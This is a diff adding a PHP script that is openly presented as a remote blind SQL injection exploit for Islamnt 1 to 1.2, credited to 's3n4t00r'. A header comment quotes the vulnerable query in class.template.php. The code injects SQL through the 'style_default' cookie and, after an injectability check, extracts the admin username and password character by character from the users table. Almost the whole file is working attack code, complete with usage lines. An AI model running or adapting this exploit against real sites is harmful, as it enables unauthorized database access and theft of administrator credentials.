@@ -1,0 +1,114 @@
+<?php
+/*
+  ---------------------------------------------------------------
+  Islamnt <=  Remote Blind SQL Injection Exploit by s3n4t00r
+  ---------------------------------------------------------------
+
+  Author...............: s3n4t00r
+  Home.................: Sec-w.com
+  software link........: http://www.islamnt.net/download.php
+  affected versions....: from 1 to 1.2
+  Gr34ts 4.............: Exp-Bl00d
+
+
+  [-] Vulnerable code in class/class.template.php:
+
+	public function get_template ($val)
+	{
+		 $q = new ib_query();
+	   	global $style_default;
+		 $style_def = ib_setting('style_site');
+		 $sel_temp = $q->Query("select $val from styles where id_style='$style_default'"); <-- #   here
+		 $row_temp = $q->FetchO($sel_temp);
+		 $this->temp = $row_temp->$val;
+		 $this->temp = stripslashes($this->temp);
+
+	}
+
+*/
+
+
+print "\n+------------------------------------------------------------+";
+print "\n| Islamnt <=  Remote Blind SQL Injection Exploit by s3n4t00r |";
+
+print "\n+------------------------------------------------------------+\n";
+
+
+if (!extension_loaded('curl')) die("cURL extension required\n");
+error_reporting(E_ERROR);
+set_time_limit(0);
+
+
+function get($url,$inj)
+{
+
+			$curl =	curl_init();
+			curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+			curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,3);
+			curl_setopt($curl,CURLOPT_URL,$url);
+            curl_setopt($curl, CURLOPT_COOKIE, "style_default=1$inj");
+            curl_setopt($curl, CURLOPT_HEADER, 1);
+            curl_setopt($curl, CURLOPT_VERBOSE, 0);
+			$calis = curl_exec($curl);
+			@curl_close($calis);
+            return $calis;
+
+
+}
+
+function chek_get($connect)
+{
+
+
+
+         if(eregi("<option value=''></option>",$connect))
+          {
+            return true;
+          }
+          else
+          {
+            return false;
+          }
+
+}
+
+
+if ($argc < 2)
+{
+            print "\nUsage......: php $argv[0] <url>\n";
+            print "\nExample....: php $argv[0] http://localhost/mytickets/";
+            print "\nExample....: php $argv[0] http://localhost/mytickets/\n";
+            die();
+}
+
+$sql_f = chek_get(get($argv[1],"' and 1='2 /*"));
+$sql_t = chek_get(get($argv[1],"' and 1='1 /*"));
+
+
+
+if($sql_t == $sql_f)
+{
+
+          print "\n\t sorry: magic_quotes_gpc = On ): \n";
+          die();
+}
+
+
+
+print "\n\t[+] Getting Admin Username and Password\n\n\t";
+
+
+
+for ($g = 1; $g <= 40; $g++) {  //eidt
+for ($i = 46; $i <= 122; $i++) {
+
+       $inject = chek_get(get($argv[1],"'+AnD+ascii(MiD((sElect+concat_ws(0x3a,user_user,pass_user)+frOm+users+liMit 0,1),".$g.",1))='".$i."/*"));
+
+       if($inject == $sql_t){print  chr($i);}
+}
+}
+
+
+
+
+?>
